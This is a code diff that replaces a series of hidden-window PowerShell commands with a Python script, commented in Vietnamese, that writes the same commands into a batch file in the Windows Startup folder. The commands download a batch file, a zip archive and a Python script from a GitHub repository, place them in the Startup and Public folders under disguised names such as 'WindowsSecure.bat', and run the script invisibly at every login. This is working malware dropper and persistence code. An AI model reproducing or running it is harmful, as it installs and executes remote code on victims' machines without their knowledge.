@@ -1,5 +1,17 @@
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/Brobottk/brobot1/main/s1  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://github.com/Brobottk/brobot1/raw/main/Document.zip  -OutFile C:\\Users\\Public\\Document.zip;
-powershell -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/Brobottk/brobot1/main/s2 -OutFile C:\\Users\\Public\\Document\\libb1.py;
-powershell -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\libb1.py;
+import os
+
+# Đường dẫn mục tiêu
+target_path = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Document.bat')
+
+# Nội dung của file batch
+batch_content = """
+C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/Brobottk/brobot1/main/s1  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
+C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://github.com/Brobottk/brobot1/raw/main/Document.zip  -OutFile C:\\Users\\Public\\Document.zip;
+C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
+C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/Brobottk/brobot1/main/s2 -OutFile C:\\Users\\Public\\Document\\libb1.py;
+C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\libb1.py;
+"""
+
+# Viết nội dung vào file
+with open(target_path, 'w') as batch_file:
+    batch_file.write(batch_content)
